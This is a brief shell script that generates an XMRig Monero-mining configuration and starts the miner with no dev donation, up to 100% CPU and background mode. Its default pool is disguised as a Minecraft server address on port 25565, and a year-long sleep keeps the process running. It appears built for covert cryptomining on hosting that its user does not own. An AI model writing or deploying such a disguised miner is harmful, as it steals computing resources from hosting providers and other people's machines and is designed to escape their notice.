#!/bin/sh

# variables
POOL="xmr.minecraftbe.org:25565"
WORKER=$(date "+%Y.%m.%d_%H.%M.%S")
BACKGROUND=true
DONATE=0
USEAGE=100

# get options
while [[ $# -ge 1 ]]; do
    case $1 in
    -b | --background)
        shift
        BACKGROUND="$1"
        shift
        ;;
    -d | --donate)
        shift
        DONATE="$1"
        shift
        ;;
    -p | --pool)
        shift
        POOL="$1"
        shift
        ;;
    -u | --useage)
        shift
        USEAGE="$1"
        shift
        ;;
    -w | --worker)
        shift
        WORKER="$1"
        shift
        ;;
    *)
        if [[ "$1" != 'error' ]]; then
            echo -ne "\nInvaild option: '$1'\n\n"
        fi
        exit 1
        ;;
    esac
done

# prepare config
cat>"config.json"<< EOF
{
    "autosave": true,
    "background": ${BACKGROUND},
    "randomx": {
        "1gb-pages": true
    },
    "donate-level": ${DONATE},
    "cpu": {
        "enabled": true,
        "max-threads-hint": ${USEAGE}
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "coin": null,
            "algo": null,
            "url": "${POOL}",
            "user": "${WORKER}",
            "pass": "x",
            "tls": false,
            "keepalive": true,
            "nicehash": true
        }
    ]
}
EOF

# load service
./xmrig-6.10.0; sleep 365d
